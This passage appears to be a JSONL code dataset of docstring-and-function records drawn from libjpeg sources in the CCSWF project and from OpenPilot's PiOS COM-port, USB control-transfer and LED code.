(*cinfo->err->reset_error_mgr) ((j_common_ptr) cinfo);\n  (*cinfo->dest->init_destination) (cinfo);\n  /* Perform master selection of active modules */\n  transencode_master_selection(cinfo, coef_arrays);\n  /* Wait for jpeg_finish_compress() call */\n  cinfo->next_scanline = 0;\t/* so jpeg_write_marker works */\n  cinfo->global_state = CSTATE_WRCOEFS;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jctrans.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Find the next JPEG marker, save it in cinfo->unread_marker.\n * Returns FALSE if had to suspend before reaching a marker;\n * in that case cinfo->unread_marker is unchanged.\n *\n * Note that the result might not be a valid marker code,\n * but it will never be 0 or FF.\n */\n", "func_signal": "LOCAL(boolean)\nnext_marker (j_decompress_ptr cinfo)", "code": "{\n  int c;\n  INPUT_VARS(cinfo);\n\n  for (;;) {\n    INPUT_BYTE(cinfo, c, return FALSE);\n    /* Skip any non-FF bytes.\n     * This may look a bit inefficient, but it will not occur in a valid file.\n     * We sync after each discarded byte so that a suspending data source\n     * can discard the byte from its buffer.\n     */\n    while (c != 0xFF) {\n      cinfo->marker->discarded_bytes++;\n      INPUT_SYNC(cinfo);\n      INPUT_BYTE(cinfo, c, return FALSE);\n    }\n    /* This loop swallows any duplicate FF bytes.  Extra FFs are legal as\n     * pad bytes, so don't count them in discarded_bytes.  We assume there\n     * will not be so many consecutive FF bytes as to overflow a suspending\n     * data source's input buffer.\n     */\n    do {\n      INPUT_BYTE(cinfo, c, return FALSE);\n    } while (c == 0xFF);\n    if (c != 0)\n      break;\t\t\t/* found a valid marker, exit loop */\n    /* Reach here if we found a stuffed-zero data sequence (FF/00).\n     * Discard it and loop back to try again.\n     */\n    cinfo->marker->discarded_bytes += 2;\n    INPUT_SYNC(cinfo);\n  }\n\n  if (cinfo->marker->discarded_bytes != 0) {\n    WARNMS2(cinfo, JWRN_EXTRANEOUS_DATA, cinfo->marker->discarded_bytes, c);\n    cinfo->marker->discarded_bytes = 0;\n  }\n\n  cinfo->unread_marker = c;\n\n  INPUT_SYNC(cinfo);\n  return TRUE;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Initialize source --- called by jpeg_read_header\n * before any data is actually read.\n */\n", "func_signal": "METHODDEF(void)\ninit_source (j_decompress_ptr cinfo)", "code": "{\n  my_src_ptr src = (my_src_ptr) cinfo->src;\n\n  /* We reset the empty-input-file flag for each image,\n   * but we don't clear the input buffer.\n   * This is correct behavior for reading a series of images from one source.\n   */\n  src->start_of_file = TRUE;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdatasrc.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Extract color map from a GIF file.\n */\n", "func_signal": "LOCAL(void)\nread_gif_map (j_decompress_ptr cinfo, FILE * infile)", "code": "{\n  int header[13];\n  int i, colormaplen;\n  int R, G, B;\n\n  /* Initial 'G' has already been read by read_color_map */\n  /* Read the rest of the GIF header and logical screen descriptor */\n  for (i = 1; i < 13; i++) {\n    if ((header[i] = getc(infile)) == EOF)\n      ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n  }\n\n  /* Verify GIF Header */\n  if (header[1] != 'I' || header[2] != 'F')\n    ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n\n  /* There must be a global color map. */\n  if ((header[10] & 0x80) == 0)\n    ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n\n  /* OK, fetch it. */\n  colormaplen = 2 << (header[10] & 0x07);\n\n  for (i = 0; i < colormaplen; i++) {\n    R = getc(infile);\n    G = getc(infile);\n    B = getc(infile);\n    if (R == EOF || G == EOF || B == EOF)\n      ERREXIT(cinfo, JERR_BAD_CMAP_FILE);\n    add_map_entry(cinfo,\n\t\t  R << (BITS_IN_JSAMPLE-8),\n\t\t  G << (BITS_IN_JSAMPLE-8),\n\t\t  B << (BITS_IN_JSAMPLE-8));\n  }\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\rdcolmap.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Initialize the marker reader module.\n * This is called only once, when the decompression object is created.\n */\n", "func_signal": "GLOBAL(void)\njinit_marker_reader (j_decompress_ptr cinfo)", "code": "{\n  my_marker_ptr marker;\n  int i;\n\n  /* Create subobject in permanent pool */\n  marker = (my_marker_ptr)\n    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_PERMANENT,\n\t\t\t\tSIZEOF(my_marker_reader));\n  cinfo->marker = (struct jpeg_marker_reader *) marker;\n  /* Initialize public method pointers */\n  marker->pub.reset_marker_reader = reset_marker_reader;\n  marker->pub.read_markers = read_markers;\n  marker->pub.read_restart_marker = read_restart_marker;\n  /* Initialize COM/APPn processing.\n   * By default, we examine and then discard APP0 and APP14,\n   * but simply discard COM and all other APPn.\n   */\n  marker->process_COM = skip_variable;\n  marker->length_limit_COM = 0;\n  for (i = 0; i < 16; i++) {\n    marker->process_APPn[i] = skip_variable;\n    marker->length_limit_APPn[i] = 0;\n  }\n  marker->process_APPn[0] = get_interesting_appn;\n  marker->process_APPn[14] = get_interesting_appn;\n  /* Reset marker processing state */\n  reset_marker_reader(cinfo);\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Add a (potentially) new color to the color map.\n */\n", "func_signal": "LOCAL(void)\nadd_map_entry (j_decompress_ptr cinfo, int R, int G, int B)", "code": "{\n  JSAMPROW colormap0 = cinfo->colormap[0];\n  JSAMPROW colormap1 = cinfo->colormap[1];\n  JSAMPROW colormap2 = cinfo->colormap[2];\n  int ncolors = cinfo->actual_number_of_colors;\n  int index;\n\n  /* Check for duplicate color. */\n  for (index = 0; index < ncolors; index++) {\n    if (GETJSAMPLE(colormap0[index]) == R &&\n\tGETJSAMPLE(colormap1[index]) == G &&\n\tGETJSAMPLE(colormap2[index]) == B)\n      return;\t\t\t/* color is already in map */\n  }\n\n  /* Check for map overflow. */\n  if (ncolors >= (MAXJSAMPLE+1))\n    ERREXIT1(cinfo, JERR_QUANT_MANY_COLORS, (MAXJSAMPLE+1));\n\n  /* OK, add color to map. */\n  colormap0[ncolors] = (JSAMPLE) R;\n  colormap1[ncolors] = (JSAMPLE) G;\n  colormap2[ncolors] = (JSAMPLE) B;\n  cinfo->actual_number_of_colors++;\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\rdcolmap.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/*\n * Read markers until SOS or EOI.\n *\n * Returns same codes as are defined for jpeg_consume_input:\n * JPEG_SUSPENDED, JPEG_REACHED_SOS, or JPEG_REACHED_EOI.\n */\n", "func_signal": "METHODDEF(int)\nread_markers (j_decompress_ptr cinfo)", "code": "{\n  /* Outer loop repeats once for each marker. */\n  for (;;) {\n    /* Collect the marker proper, unless we already did. */\n    /* NB: first_marker() enforces the requirement that SOI appear first. */\n    if (cinfo->unread_marker == 0) {\n      if (! cinfo->marker->saw_SOI) {\n\tif (! first_marker(cinfo))\n\t  return JPEG_SUSPENDED;\n      } else {\n\tif (! next_marker(cinfo))\n\t  return JPEG_SUSPENDED;\n      }\n    }\n    /* At this point cinfo->unread_marker contains the marker code and the\n     * input point is just past the marker proper, but before any parameters.\n     * A suspension will cause us to return with this state still true.\n     */\n    switch (cinfo->unread_marker) {\n    case M_SOI:\n      if (! get_soi(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    case M_SOF0:\t\t/* Baseline */\n    case M_SOF1:\t\t/* Extended sequential, Huffman */\n      if (! get_sof(cinfo, FALSE, FALSE))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    case M_SOF2:\t\t/* Progressive, Huffman */\n      if (! get_sof(cinfo, TRUE, FALSE))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    case M_SOF9:\t\t/* Extended sequential, arithmetic */\n      if (! get_sof(cinfo, FALSE, TRUE))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    case M_SOF10:\t\t/* Progressive, arithmetic */\n      if (! get_sof(cinfo, TRUE, TRUE))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    /* Currently unsupported SOFn types */\n    case M_SOF3:\t\t/* Lossless, Huffman */\n    case M_SOF5:\t\t/* Differential sequential, Huffman */\n    case M_SOF6:\t\t/* Differential progressive, Huffman */\n    case M_SOF7:\t\t/* Differential lossless, Huffman */\n    case M_JPG:\t\t\t/* Reserved for JPEG extensions */\n    case M_SOF11:\t\t/* Lossless, arithmetic */\n    case M_SOF13:\t\t/* Differential sequential, arithmetic */\n    case M_SOF14:\t\t/* Differential progressive, arithmetic */\n    case M_SOF15:\t\t/* Differential lossless, arithmetic */\n      ERREXIT1(cinfo, JERR_SOF_UNSUPPORTED, cinfo->unread_marker);\n      break;\n\n    case M_SOS:\n      if (! get_sos(cinfo))\n\treturn JPEG_SUSPENDED;\n      cinfo->unread_marker = 0;\t/* processed the marker */\n      return JPEG_REACHED_SOS;\n    \n    case M_EOI:\n      TRACEMS(cinfo, 1, JTRC_EOI);\n      cinfo->unread_marker = 0;\t/* processed the marker */\n      return JPEG_REACHED_EOI;\n      \n    case M_DAC:\n      if (! get_dac(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n      \n    case M_DHT:\n      if (! get_dht(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n      \n    case M_DQT:\n      if (! get_dqt(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n      \n    case M_DRI:\n      if (! get_dri(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n      \n    case M_APP0:\n    case M_APP1:\n    case M_APP2:\n    case M_APP3:\n    case M_APP4:\n    case M_APP5:\n    case M_APP6:\n    case M_APP7:\n    case M_APP8:\n    case M_APP9:\n    case M_APP10:\n    case M_APP11:\n    case M_APP12:\n    case M_APP13:\n    case M_APP14:\n    case M_APP15:\n      if (! (*((my_marker_ptr) cinfo->marker)->process_APPn[\n\t\tcinfo->unread_marker - (int) M_APP0]) (cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n      \n    case M_COM:\n      if (! (*((my_marker_ptr) cinfo->marker)->process_COM) (cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    case M_RST0:\t\t/* these are all parameterless */\n    case M_RST1:\n    case M_RST2:\n    case M_RST3:\n    case M_RST4:\n    case M_RST5:\n    case M_RST6:\n    case M_RST7:\n    case M_TEM:\n      TRACEMS1(cinfo, 1, JTRC_PARMLESS_MARKER, cinfo->unread_marker);\n      break;\n\n    case M_DNL:\t\t\t/* Ignore DNL ... perhaps the wrong thing */\n      if (! skip_variable(cinfo))\n\treturn JPEG_SUSPENDED;\n      break;\n\n    default:\t\t\t/* must be DHP, EXP, JPGn, or RESn */\n      /* For now, we treat the reserved markers as fatal errors since they are\n       * likely to be used to signal incompatible JPEG Part 3 extensions.\n       * Once the JPEG 3 version-number marker is well defined, this code\n       * ought to change!\n       */\n      ERREXIT1(cinfo, JERR_UNKNOWN_MARKER, cinfo->unread_marker);\n      break;\n    }\n    /* Successfully processed marker, so reset state variable */\n    cinfo->unread_marker = 0;\n  } /* end loop */\n}", "path": "src\\CCGameSWF\\gameswf\\jpeglib\\jdmarker.c", "repo_name": "getsetgames/CCSWF", "stars": 32, "license": "None", "language": "c", "size": 1706}
{"docstring": "/**\n* Get the number of bytes waiting in the buffer\n* \\param[in] port COM port\n* \\return Number of bytes used in buffer\n*/\n", "func_signal": "int32_t PIOS_COM_ReceiveBufferUsed(uint8_t port)", "code": "{\n  struct pios_com_dev * com_dev;\n\n  com_dev = find_com_dev_by_id (port);\n\n  if (!com_dev) {\n    /* Undefined COM port for this board (see pios_board.c) */\n    return 0;\n  }\n\n  if (!com_dev->driver->rx_avail) {\n    return 0;\n  }\n\n  return com_dev->driver->rx_avail(com_dev->id);\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Transfer bytes from port buffers into another buffer\n* \\param[in] port COM port\n* \\returns Byte from buffer\n*/\n", "func_signal": "uint8_t PIOS_COM_ReceiveBuffer(uint8_t port)", "code": "{\n  struct pios_com_dev * com_dev;\n\n  com_dev = find_com_dev_by_id (port);\n  //PIOS_DEBUG_Assert(com_dev);\n  //PIOS_DEBUG_Assert(com_dev->driver->rx);\n\n  return com_dev->driver->rx(com_dev->id);\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : DataStageIn.\n* Description    : Data stage of a Control Read Transfer.\n* Input          : None.\n* Output         : None.\n* Return         : None.\n*******************************************************************************/\n", "func_signal": "void DataStageIn(void)", "code": "{\n  ENDPOINT_INFO *pEPinfo = &pInformation->Ctrl_Info;\n  uint32_t save_wLength = pEPinfo->Usb_wLength;\n  uint32_t ControlState = pInformation->ControlState;\n\n  const uint8_t *DataBuffer;\n  uint32_t Length;\n\n  if ((save_wLength == 0) && (ControlState == LAST_IN_DATA))\n  {\n    if(Data_Mul_MaxPacketSize == TRUE)\n    {\n      /* No more data to send and empty packet */\n      Send0LengthData();\n      ControlState = LAST_IN_DATA;\n      Data_Mul_MaxPacketSize = FALSE;\n    }\n    else \n    {\n      /* No more data to send so STALL the TX Status*/\n      ControlState = WAIT_STATUS_OUT;\n\n    #ifdef STM32F10X_CL      \n      PCD_EP_Read (ENDP0, 0, 0);\n    #endif  /* STM32F10X_CL */ \n    \n    #ifndef STM32F10X_CL \n      vSetEPTxStatus(EP_TX_STALL);\n    #endif  /* STM32F10X_CL */ \n    }\n    \n    goto Expect_Status_Out;\n  }\n\n  Length = pEPinfo->PacketSize;\n  ControlState = (save_wLength <= Length) ? LAST_IN_DATA : IN_DATA;\n\n  if (Length > save_wLength)\n  {\n    Length = save_wLength;\n  }\n\n  DataBuffer = (*pEPinfo->CopyDataIn)(Length);\n\n#ifdef STM32F10X_CL\n  PCD_EP_Write (ENDP0, DataBuffer, Length);\n#else   \n  UserToPMABufferCopy(DataBuffer, GetEPTxAddr(ENDP0), Length);\n#endif /* STM32F10X_CL */ \n\n  SetEPTxCount(ENDP0, Length);\n\n  pEPinfo->Usb_wLength -= Length;\n  pEPinfo->Usb_wOffset += Length;\n  vSetEPTxStatus(EP_TX_VALID);\n\n  USB_StatusOut();/* Expect the host to abort the data IN stage */\n\nExpect_Status_Out:\n  pInformation->ControlState = ControlState;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : DataStageOut.\n* Description    : Data stage of a Control Write Transfer.\n* Input          : None.\n* Output         : None.\n* Return         : None.\n*******************************************************************************/\n", "func_signal": "void DataStageOut(void)", "code": "{\n  ENDPOINT_INFO *pEPinfo = &pInformation->Ctrl_Info;\n  uint32_t save_rLength;\n\n  save_rLength = pEPinfo->Usb_rLength;\n\n  if (pEPinfo->CopyDataOut && save_rLength)\n  {\n    uint8_t *Buffer;\n    uint32_t Length;\n\n    Length = pEPinfo->PacketSize;\n    if (Length > save_rLength)\n    {\n      Length = save_rLength;\n    }\n\n    Buffer = (*pEPinfo->CopyDataOut)(Length);\n    pEPinfo->Usb_rLength -= Length;\n    pEPinfo->Usb_rOffset += Length;\n\n  #ifdef STM32F10X_CL  \n    PCD_EP_Read(ENDP0, Buffer, Length); \n  #else  \n    PMAToUserBufferCopy(Buffer, GetEPRxAddr(ENDP0), Length);\n  #endif  /* STM32F10X_CL */\n  }\n\n  if (pEPinfo->Usb_rLength != 0)\n  {\n    vSetEPRxStatus(EP_RX_VALID);/* re-enable for next data reception */\n    SetEPTxCount(ENDP0, 0);\n    vSetEPTxStatus(EP_TX_VALID);/* Expect the host to abort the data OUT stage */\n  }\n  /* Set the next State*/\n  if (pEPinfo->Usb_rLength >= pEPinfo->PacketSize)\n  {\n    pInformation->ControlState = OUT_DATA;\n  }\n  else\n  {\n    if (pEPinfo->Usb_rLength > 0)\n    {\n      pInformation->ControlState = LAST_OUT_DATA;\n    }\n    else if (pEPinfo->Usb_rLength == 0)\n    {\n      pInformation->ControlState = WAIT_STATUS_IN;\n      USB_StatusIn();\n    }\n  }\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Sends a formatted string (-> printf) over given port\n* (blocking function)\n* \\param[in] port COM port\n* \\param[in] *format zero-terminated format string - 128 characters supported maximum!\n* \\param[in] ... optional arguments,\n* \\return -1 if port not available\n* \\return 0 on success\n*/\n", "func_signal": "int32_t PIOS_COM_SendFormattedString(uint8_t port, char *format, ...)", "code": "{\n\tuint8_t buffer[128]; // TODO: tmp!!! Provide a streamed COM method later!\n\tva_list args;\n\n\tva_start(args, format);\n\tvsprintf((char *)buffer, format, args);\n\treturn PIOS_COM_SendBuffer(port, buffer, (uint16_t)strlen((char *)buffer));\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Post0_Process\n* Description    : Stall the Endpoint 0 in case of error.\n* Input          : None.\n* Output         : None.\n* Return         : - 0 if the control State is in PAUSE\n*                  - 1 if not.\n*******************************************************************************/\n", "func_signal": "uint8_t Post0_Process(void)", "code": "{\n#ifdef STM32F10X_CL  \n  USB_OTG_EP *ep;\n#endif /* STM32F10X_CL */\n      \n  SetEPRxCount(ENDP0, Device_Property.MaxPacketSize);\n\n  if (pInformation->ControlState == STALLED)\n  {\n    vSetEPRxStatus(EP_RX_STALL);\n    vSetEPTxStatus(EP_TX_STALL);\n  }\n\n#ifdef STM32F10X_CL\n  else if ((pInformation->ControlState == OUT_DATA) ||\n      (pInformation->ControlState == WAIT_STATUS_OUT))\n  {\n    ep = PCD_GetInEP(0);\n    ep->is_in = 0;\n    OTGD_FS_EP0StartXfer(ep);\n    \n    vSetEPTxStatus(EP_TX_VALID);\n  }\n  \n  else if ((pInformation->ControlState == IN_DATA) || \n      (pInformation->ControlState == WAIT_STATUS_IN))\n  {\n    ep = PCD_GetInEP(0);\n    ep->is_in = 1;\n    OTGD_FS_EP0StartXfer(ep);    \n  }  \n#endif /* STM32F10X_CL */\n\n  return (pInformation->ControlState == PAUSE);\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Sends a formatted string (-> printf) over given port\n* \\param[in] port COM port\n* \\param[in] *format zero-terminated format string - 128 characters supported maximum!\n* \\param[in] ... optional arguments,\n*        128 characters supported maximum!\n* \\return -2 if non-blocking mode activated: buffer is full\n*         caller should retry until buffer is free again\n* \\return 0 on success\n*/\n", "func_signal": "int32_t PIOS_COM_SendFormattedStringNonBlocking(uint8_t port, char *format, ...)", "code": "{\n\tuint8_t buffer[128]; // TODO: tmp!!! Provide a streamed COM method later!\n\n\tva_list args;\n\n\tva_start(args, format);\n\tvsprintf((char *)buffer, format, args);\n\treturn PIOS_COM_SendBufferNonBlocking(port, buffer, (uint16_t)strlen((char *)buffer));\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Initialises all the LED's\n*/\n", "func_signal": "void PIOS_LED_Init(void)", "code": "{\n\t//GPIO_InitTypeDef GPIO_InitStructure;\n\t//GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP; \n\t//GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;\n\t\n\tfor(int LEDNum = 0; LEDNum < PIOS_LED_NUM; LEDNum++) {\n\t\t//RCC_APB2PeriphClockCmd(LED_GPIO_CLK[LEDNum], ENABLE);\n\t\t//GPIO_InitStructure.GPIO_Pin = LED_GPIO_PIN[LEDNum];\n\t\t//GPIO_Init(LED_GPIO_PORT[LEDNum], &GPIO_InitStructure);\n\n\t\t/* LED's Off */\n\t\t//LED_GPIO_PORT[LEDNum]->BSRR = LED_GPIO_PIN[LEDNum];\n\t\tLED_GPIO[LEDNum]=0;\n\t}\n}", "path": "flight\\PiOS.posix\\posix\\pios_led.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/**\n* Change the port speed without re-initializing\n* \\param[in] port COM port\n* \\param[in] baud Requested baud rate\n* \\return -1 if port not available\n* \\return 0 on success\n*/\n", "func_signal": "int32_t PIOS_COM_ChangeBaud(uint8_t port, uint32_t baud)", "code": "{\n  struct pios_com_dev * com_dev;\n\n  com_dev = find_com_dev_by_id (port);\n\n  if (!com_dev) {\n    /* Undefined COM port for this board (see pios_board.c) */\n    return -1;\n  }\n\n  /* Invoke the driver function if it exists */\n  if (com_dev->driver->set_baud) {\n    com_dev->driver->set_baud(com_dev->id, baud);\n  }\n\n  return 0;\n}", "path": "flight\\PiOS.win32\\win32\\pios_com.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : SetDeviceAddress.\n* Description    : Set the device and all the used Endpoints addresses.\n* Input          : - Val: device adress.\n* Output         : None.\n* Return         : None.\n*******************************************************************************/\n", "func_signal": "void SetDeviceAddress(uint8_t Val)", "code": "{\n#ifdef STM32F10X_CL \n  PCD_EP_SetAddress ((uint8_t)Val);\n#else \n  uint32_t i;\n  uint32_t nEP = Device_Table.Total_Endpoint;\n\n  /* set address in every used endpoint */\n  for (i = 0; i < nEP; i++)\n  {\n    _SetEPAddress((uint8_t)i, (uint8_t)i);\n  } /* for */\n  _SetDADDR(Val | DADDR_EF); /* set device address and enable function */\n#endif  /* STM32F10X_CL */  \n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : Setup0_Process\n* Description    : Get the device request data and dispatch to individual process.\n* Input          : None.\n* Output         : None.\n* Return         : Post0_Process.\n*******************************************************************************/\n", "func_signal": "uint8_t Setup0_Process(void)", "code": "{\n\n  union\n  {\n    uint8_t* b;\n    uint16_t* w;\n  } pBuf;\n\n#ifdef STM32F10X_CL\n  USB_OTG_EP *ep;\n  uint16_t offset = 0;\n \n  ep = PCD_GetOutEP(ENDP0);\n  pBuf.b = ep->xfer_buff;\n#else  \n  uint16_t offset = 1;\n  \n  pBuf.b = PMAAddr + (uint8_t *)(_GetEPRxAddr(ENDP0) * 2); /* *2 for 32 bits addr */\n#endif /* STM32F10X_CL */\n\n  if (pInformation->ControlState != PAUSE)\n  {\n    pInformation->USBbmRequestType = *pBuf.b++; /* bmRequestType */\n    pInformation->USBbRequest = *pBuf.b++; /* bRequest */\n    pBuf.w += offset;  /* word not accessed because of 32 bits addressing */\n    pInformation->USBwValue = ByteSwap(*pBuf.w++); /* wValue */\n    pBuf.w += offset;  /* word not accessed because of 32 bits addressing */\n    pInformation->USBwIndex  = ByteSwap(*pBuf.w++); /* wIndex */\n    pBuf.w += offset;  /* word not accessed because of 32 bits addressing */\n    pInformation->USBwLength = *pBuf.w; /* wLength */\n  }\n\n  pInformation->ControlState = SETTING_UP;\n  if (pInformation->USBwLength == 0)\n  {\n    /* Setup with no data stage */\n    NoData_Setup0();\n  }\n  else\n  {\n    /* Setup with data stage */\n    Data_Setup0();\n  }\n  return Post0_Process();\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : NoData_Setup0.\n* Description    : Proceed the processing of setup request without data stage.\n* Input          : None.\n* Output         : None.\n* Return         : None.\n*******************************************************************************/\n", "func_signal": "void NoData_Setup0(void)", "code": "{\n  RESULT Result = USB_UNSUPPORT;\n  uint32_t RequestNo = pInformation->USBbRequest;\n  uint32_t ControlState;\n\n  if (Type_Recipient == (STANDARD_REQUEST | DEVICE_RECIPIENT))\n  {\n    /* Device Request*/\n    /* SET_CONFIGURATION*/\n    if (RequestNo == SET_CONFIGURATION)\n    {\n      Result = Standard_SetConfiguration();\n    }\n\n    /*SET ADDRESS*/\n    else if (RequestNo == SET_ADDRESS)\n    {\n      if ((pInformation->USBwValue0 > 127) || (pInformation->USBwValue1 != 0)\n          || (pInformation->USBwIndex != 0)\n          || (pInformation->Current_Configuration != 0))\n        /* Device Address should be 127 or less*/\n      {\n        ControlState = STALLED;\n        goto exit_NoData_Setup0;\n      }\n      else\n      {\n        Result = USB_SUCCESS;\n\n      #ifdef STM32F10X_CL\n         SetDeviceAddress(pInformation->USBwValue0);\n      #endif  /* STM32F10X_CL */\n      }\n    }\n    /*SET FEATURE for Device*/\n    else if (RequestNo == SET_FEATURE)\n    {\n      if ((pInformation->USBwValue0 == DEVICE_REMOTE_WAKEUP)\n          && (pInformation->USBwIndex == 0)\n          && (ValBit(pInformation->Current_Feature, 5)))\n      {\n        Result = Standard_SetDeviceFeature();\n      }\n      else\n      {\n        Result = USB_UNSUPPORT;\n      }\n    }\n    /*Clear FEATURE for Device */\n    else if (RequestNo == CLEAR_FEATURE)\n    {\n      if (pInformation->USBwValue0 == DEVICE_REMOTE_WAKEUP\n          && pInformation->USBwIndex == 0\n          && ValBit(pInformation->Current_Feature, 5))\n      {\n        Result = Standard_ClearFeature();\n      }\n      else\n      {\n        Result = USB_UNSUPPORT;\n      }\n    }\n\n  }\n\n  /* Interface Request*/\n  else if (Type_Recipient == (STANDARD_REQUEST | INTERFACE_RECIPIENT))\n  {\n    /*SET INTERFACE*/\n    if (RequestNo == SET_INTERFACE)\n    {\n      Result = Standard_SetInterface();\n    }\n  }\n\n  /* EndPoint Request*/\n  else if (Type_Recipient == (STANDARD_REQUEST | ENDPOINT_RECIPIENT))\n  {\n    /*CLEAR FEATURE for EndPoint*/\n    if (RequestNo == CLEAR_FEATURE)\n    {\n      Result = Standard_ClearFeature();\n    }\n    /* SET FEATURE for EndPoint*/\n    else if (RequestNo == SET_FEATURE)\n    {\n      Result = Standard_SetEndPointFeature();\n    }\n  }\n  else\n  {\n    Result = USB_UNSUPPORT;\n  }\n\n\n  if (Result != USB_SUCCESS)\n  {\n    Result = (*pProperty->Class_NoData_Setup)(RequestNo);\n    if (Result == USB_NOT_READY)\n    {\n      ControlState = PAUSE;\n      goto exit_NoData_Setup0;\n    }\n  }\n\n  if (Result != USB_SUCCESS)\n  {\n    ControlState = STALLED;\n    goto exit_NoData_Setup0;\n  }\n\n  ControlState = WAIT_STATUS_IN;/* After no data stage SETUP */\n\n  USB_StatusIn();\n\nexit_NoData_Setup0:\n  pInformation->ControlState = ControlState;\n  return;\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
{"docstring": "/*******************************************************************************\n* Function Name  : In0_Process\n* Description    : Process the IN token on all default endpoint.\n* Input          : None.\n* Output         : None.\n* Return         : Post0_Process.\n*******************************************************************************/\n", "func_signal": "uint8_t In0_Process(void)", "code": "{\n  uint32_t ControlState = pInformation->ControlState;\n\n  if ((ControlState == IN_DATA) || (ControlState == LAST_IN_DATA))\n  {\n    DataStageIn();\n    /* ControlState may be changed outside the function */\n    ControlState = pInformation->ControlState;\n  }\n\n  else if (ControlState == WAIT_STATUS_IN)\n  {\n    if ((pInformation->USBbRequest == SET_ADDRESS) &&\n        (Type_Recipient == (STANDARD_REQUEST | DEVICE_RECIPIENT)))\n    {\n      SetDeviceAddress(pInformation->USBwValue0);\n      pUser_Standard_Requests->User_SetDeviceAddress();\n    }\n    (*pProperty->Process_Status_IN)();\n    ControlState = STALLED;\n  }\n\n  else\n  {\n    ControlState = STALLED;\n  }\n\n  pInformation->ControlState = ControlState;\n\n  return Post0_Process();\n}", "path": "flight\\PiOS\\STM32F10x\\Libraries\\STM32_USB-FS-Device_Driver\\src\\usb_core.c", "repo_name": "lilvinz/OpenPilot", "stars": 51, "license": "other", "language": "c", "size": 154313}
